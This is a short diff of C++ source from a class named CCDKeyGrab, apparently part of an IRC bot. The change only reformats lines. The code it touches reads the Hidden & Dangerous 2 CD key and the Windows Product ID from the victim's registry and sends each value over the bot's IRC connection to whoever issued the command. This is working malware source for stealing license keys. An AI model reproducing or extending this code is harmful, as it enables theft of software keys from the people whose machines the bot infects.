@@ -278,7 +278,8 @@ bool CCDKeyGrab::HandleCommand(CMessage *pMsg)
 				Hidden and Dangerous 2
 		*/
 
-		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Illusion Softworks\\Hidden & Dangerous 2", 0, KEY_READ, &hkey);
+        dwSize = 128;
+        lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Illusion Softworks\\Hidden & Dangerous 2", 0, KEY_READ, &hkey);
 		if(RegQueryValueEx(hkey, "key", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
 			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
 				"Found Hidden and Dangerous 2 CDKey (%s).", szDataBuf);
@@ -288,7 +289,8 @@ bool CCDKeyGrab::HandleCommand(CMessage *pMsg)
 				Windows Product ID
 		*/
 
-		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hkey);
+        dwSize = 128;
+        lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hkey);
 		if(RegQueryValueEx(hkey, "ProductId", NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
 			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
 				"Found Windows Product ID (%s).", szDataBuf);
